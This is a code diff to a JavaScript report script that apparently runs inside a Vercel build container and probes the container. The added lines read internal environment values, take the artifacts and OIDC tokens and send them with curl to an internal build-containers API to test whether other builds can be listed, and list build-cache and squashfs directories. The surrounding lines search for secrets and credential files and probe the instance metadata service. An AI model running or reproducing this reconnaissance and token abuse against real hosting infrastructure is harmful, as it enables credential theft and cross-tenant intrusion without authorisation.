@@ -302,6 +302,42 @@ const report = {
       return { status: st, body };
     }),
   })),
+  // Internal env var VALUES — all non-secret internal Vercel infrastructure data
+  internalEnvValues: safe(() => {
+    const keys = [
+      'VERCEL_BUILD_IMAGE', 'VERCEL_IMAGE_ID', 'VERCEL_HIVE_VERSION', 'VERCEL_HIVE_BANDWIDTH',
+      'VERCEL_HIVE_IOPS', 'VERCEL_BUILD_PROVIDER', 'VERCEL_CELL_CREATE_TIMESTAMP',
+      'VERCEL_CONTAINER_START_TIME', 'DD_TAGS', 'TRACEPARENT', 'TRACESTATE',
+      'VERCEL_PREWARM_CLI', 'VERCEL_USE_START_CELL', 'VERCEL_DETECT_CRYPTO_MINER_IN_BUILD_LOG',
+      'VERCEL_UNIVERSAL_ENCRYPTED_ENV_FILE_SUPPORT', 'VERCEL_PROJECT_SETTINGS_NODE_VERSION',
+      'NEXT_PRIVATE_MULTI_PAYLOAD', 'VERCEL_NEXT_BUNDLED_SERVER', 'VERCEL_EDGE_FNS_ON_WORKERD',
+    ];
+    return Object.fromEntries(keys.map(k => [k, process.env[k] ?? 'absent']));
+  }),
+  // Build-containers internal API probe — can we enumerate other builds?
+  buildContainersProbe: safe(() => {
+    const ep = process.env.VERCEL_API_BUILD_CONTAINERS_ENDPOINT;
+    const artTok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    const oidcTok = process.env.VERCEL_OIDC_TOKEN;
+    if (!ep) return 'no-endpoint';
+    const probeEndpoint = (token, label) => {
+      const st = safe(() => execSync(
+        `curl -s --max-time 5 -o /tmp/bc_${label} -w '%{http_code}' -H 'Authorization: Bearer ${token}' '${ep}' 2>/dev/null || true`
+      ).toString().trim());
+      const body = safe(() => readFileSync(`/tmp/bc_${label}`, 'utf8').slice(0, 300));
+      return { status: st, body };
+    };
+    return {
+      endpoint: ep,
+      withArtifactsToken: artTok ? probeEndpoint(artTok, 'art') : 'no-art-token',
+      withOidcToken: oidcTok ? probeEndpoint(oidcTok, 'oidc') : 'no-oidc',
+      // Also try without auth to see what the error format is
+      noAuth: safe(() => {
+        const st = execSync(`curl -s --max-time 5 -o /tmp/bc_noauth -w '%{http_code}' '${ep}' 2>/dev/null || true`).toString().trim();
+        return { status: st, body: readFileSync('/tmp/bc_noauth', 'utf8').slice(0, 200) };
+      }),
+    };
+  }),
   // Filesystem survey — looking for secrets, config files, other credentials
   filesystemSurvey: safe(() => ({
     vercelDir: safe(() => execSync("ls -la /vercel/ 2>/dev/null | head -20 || true").toString().trim()),
@@ -311,6 +347,10 @@ const report = {
     vercelPath0: safe(() => execSync("ls -la /vercel/path0/ 2>/dev/null | head -15 || true").toString().trim()),
     // Look for any token/credential files
     credFiles: safe(() => execSync("find /root /tmp /vercel -name '*.token' -o -name '*.key' -o -name 'credentials' -o -name '*.pem' 2>/dev/null | head -10 || true").toString().trim()),
+    // Build cache dirs — what's inside?
+    buildCacheDirs: safe(() => execSync("ls -la /vercel/build_cache_child_* /vercel/build_cache_header* /vercel/squashfs-* /vercel/output/ 2>/dev/null | head -40 || true").toString().trim()),
+    squashfsMount: safe(() => execSync("ls -la /vercel/squashfs-*/ 2>/dev/null | head -20 || true").toString().trim()),
+    outputDir: safe(() => execSync("ls -la /vercel/output/ 2>/dev/null | head -20 || true").toString().trim()),
   })),
   // IMDS probing — additional MMDS paths beyond IAM credentials
   imds: safe(() => {
